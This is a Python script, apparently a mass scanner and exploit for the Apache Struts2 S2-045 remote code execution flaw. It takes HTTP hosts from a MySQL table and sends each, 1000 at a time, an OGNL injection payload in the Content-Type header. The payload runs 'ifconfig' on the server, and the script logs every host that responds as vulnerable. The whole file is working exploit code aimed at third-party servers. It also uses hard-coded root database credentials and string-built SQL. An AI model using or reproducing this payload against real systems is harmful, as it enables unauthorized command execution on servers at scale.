#!/usr/bin/env python
#coding:utf-8

from gevent import monkey
from gevent.pool import Pool
monkey.patch_all()
import hashlib,MySQLdb,time,paramiko
import requests

conn= MySQLdb.connect(host='localhost',port = 3306,user='root',passwd='root',db ='spider')
cur = conn.cursor()
cur.execute('SET NAMES UTF8')

def create_data(flag, res_data=None):
    sql_ipport = "select ip,port,domain from baidu_portmap where service like '%http%'"
    if flag == "ip_port":
        cur.execute(sql_ipport)
    elif flag == "ResToSql":
        ip = res_data
        cur.execute("insert into result (ip,types) values ('%s','%s')"%(ip,"s045"))
        conn.commit()
    else:
        print "fun create_data error"
    get_all = cur.fetchall()
    print "struts045 burp count :",len(get_all)
    return list(get_all)


def verify(url):
    headers = {'Content-Type': "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ifconfig').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"}
    data = '---------------------------acebdf13572468\nContent-Disposition: form-data; name="fieldNameHere"; filename="codesec.txt"\nContent-Type: text/plain\n\nebd2e882491f6f116ff19ecc826842cab\n\n---------------------------acebdf13572468--'
    try:
        session = requests.Session()
        session.trust_env = False
        r = session.get(url, data=data, headers=headers, timeout=3, allow_redirects=False)
        if 'inet addr' in r.content:
            print  'Vul'
            create_data("ResToSql", url)
    except Exception, e:
        print e

def make_pool():
    pool = []
    https_tag = "https://"
    http_tag = "http://"
    http_tail = "/index.action"
    org_pool = create_data("ip_port")
    for x in org_pool:
        if x[1] == "443":
            pool.append(https_tag+x[0]+http_tail)
        else:
            pool.append(http_tag+x[0]+":"+x[1]+http_tail)
            pool.append(http_tag+x[2]+":"+x[1]+http_tail)
    ip_pool = list(set(pool))
    return  ip_pool

def s045_run():
    ip_pool = make_pool()
    pool = Pool(1000)
    #ip_pool = ["127.0.0.1"]
    pool.map(verify,ip_pool)

s045_run()